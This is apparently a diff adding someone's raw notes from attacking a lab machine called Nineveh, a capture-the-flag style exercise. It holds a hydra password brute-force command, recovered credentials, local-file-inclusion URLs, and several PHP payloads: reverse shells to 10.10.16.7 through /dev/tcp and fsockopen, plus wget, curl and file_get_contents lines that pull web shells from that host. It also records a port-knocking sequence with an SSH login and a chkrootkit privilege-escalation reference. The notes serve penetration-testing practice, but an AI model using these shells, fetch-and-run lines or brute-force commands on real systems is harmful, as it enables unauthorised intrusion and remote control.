@@ -1,0 +1,140 @@
+hydra -l "" -F -V -P /usr/share/wordlists/rockyou.txt 10.129.156.76 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:F=Incorrect password." -I
+
+hydra -l "" -F -V -P /usr/share/wordlists/rockyou.txt 10.129.156.76 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:F=Incorrect password." -I
+
+https://refabr1k.gitbook.io/oscp/exploitation-1/bruteforce
+
+
+admin:password123
+admin:1q2w3e4r5t
+
+
+Have you fixed the login page yet! hardcoded username and password is really bad idea!
+
+check your serect folder to get in! figure it out! this is your challenge
+
+Improve the db interface.
+~amrois
+
+
+Warning:  include(): http:// wrapper is disabled in the server configuration by allow_url_fopen=0 in /var/www/html/department/manage.php on line 31
+
+http://10.129.156.76/department/manage.php?notes=/var/tmp/ninevehNotes.php
+
+important thing is the filename
+
+use phpliteadmin to generate a fill at /var/tmp/ninevehNotes.php
+
+
+http:
+/var/www/html/info.php
+/var/www/html/department/index.php
+/var/www/html/department/manage.php
+/var/www/html/department/files/ninevehNotes.txt
+/var/www/html/department/files/test.txt
+/var/www/html/department/test.txt
+http://10.129.156.76/department/manage.php?notes=/var/www/html/department/files/ninevehNotes.txt
+
+
+https:
+/var/www/ssl/index.html
+/var/www/ssl/db/index.php
+/var/www/ssl/secure_notes/index.html
+/var/tmp/test.txt
+
+http://10.129.156.76/department/manage.php?notes=/var/tmp/ninevehNotes.php
+
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.7/443 0>&1'");?>
+
+<?php $sock=fsockopen("10.10.16.7",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>
+
+<?php $url = 'http://10.10.16.7/cmd.php'; $file_name = basename($url); if (file_put_contents("/var/www/html/department/cmd.php", file_get_contents($url))) { echo "File downloaded successfully"; } else { echo "File downloading failed."; }?>
+
+
+<?php exec("wget http://10.10.16.7/cmd.php -O /var/www/html/department/cmd.php"); ?>
+
+<?php exec("curl http://10.10.16.7/SHELL.php -o /tmp/ninevehNotes.php"); ?> ************
+
+<?php
+  
+    // Initialize a file URL to the variable
+    $url = 'http://10.10.16.7';
+      
+    // Use basename() function to return the base name of file
+    $file_name = basename($url);
+      
+    // Use file_get_contents() function to get the file
+    // from url and use file_put_contents() function to
+    // save the file by using base name
+    if (file_put_contents($file_name, file_get_contents($url)))
+    {
+        echo "File downloaded successfully";
+    }
+    else
+    {
+        echo "File downloading failed.";
+    }
+?>
+
+
+From root@nineveh.htb  Fri Jun 23 14:04:19 2017
+Return-Path: <root@nineveh.htb>
+X-Original-To: amrois
+Delivered-To: amrois@nineveh.htb
+Received: by nineveh.htb (Postfix, from userid 1000)
+        id D289B2E3587; Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
+To: amrois@nineveh.htb
+From: root@nineveh.htb
+Subject: Another Important note!
+Message-Id: <20170623190419.D289B2E3587@nineveh.htb>
+Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
+
+Amrois! please knock the door next time! 571 290 911
+
+
+Enumerated everything.... use KE
+
+
+
+
+can go from www-data to amrois also:
+https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html#shortcut---ssh-from-localhost
+
+always worth running strings on images (CTF technique)
+run binwalk on image
+run binwalk with e flag to extract data from images
+
+ps -auxw:
+knockd is running
+
+nmap port knock
+
+for i in 571 290 911; do
+> nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.10.43 >/dev/null
+> done; ssh -i ~/keys/id_rsa_nineveh_amrois amrois@10.10.10.43
+
+
+www-data@nineveh:/$ cat /etc/knockd.conf 
+[options]
+ logfile = /var/log/knockd.log
+ interface = ens33
+
+[openSSH]
+ sequence = 571, 290, 911 
+ seq_timeout = 5
+ start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+
+[closeSSH]
+ sequence = 911,290,571
+ seq_timeout = 5
+ start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+
+
+
+
+/report directory
+chkrootkit output
+https://www.exploit-db.com/exploits/33899
+can privesc also use chrootkit from www-data/amrois to root
